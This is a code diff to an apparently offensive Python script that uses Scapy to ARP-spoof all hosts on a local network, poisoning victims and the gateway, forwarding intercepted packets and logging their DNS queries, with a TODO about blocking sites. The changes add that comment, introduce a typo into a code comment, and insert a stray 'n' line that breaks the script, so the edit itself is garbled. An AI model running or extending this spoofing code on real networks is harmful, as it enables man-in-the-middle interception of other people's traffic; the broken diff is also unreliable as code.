@@ -31,6 +31,7 @@ def handle_Packet(pkt):
         #print pkt.show()
         functions.sendPacket(pkt,gatewayMAC)
         if DNS in pkt:
+            #TODO: get DNS query and block a site
             logging.info('DNS query:',pkt[DNS].qd)
     else:
         if pkt[ARP].op == 2: #check if ARP operation is: is-at
@@ -57,7 +58,7 @@ def arpSpoof(router,localHost):
             for host in localAddresses:
                 if host != router and host != localHost: #check that ip does not match default gateway or local host to not send packets to them
 
-                    victimPacket = Ether()/ARP(op=2,psrc = router, pdst=host)#create arp packets
+                    victimPacket = Ether()/ARP(op=2,psrc = router, pdst=host)#creante arp packets
                     gatewayPacket=Ether()/ARP(op=2,psrc=host,pdst=router)
                     logging.debug('spoofing: '+victimPacket[ARP].pdst)
                     sendp(victimPacket)#send packets
@@ -91,7 +92,7 @@ def setup():
     logging.debug('spoofing all hosts on network')
 
 
-
+n
 
 
 def main():
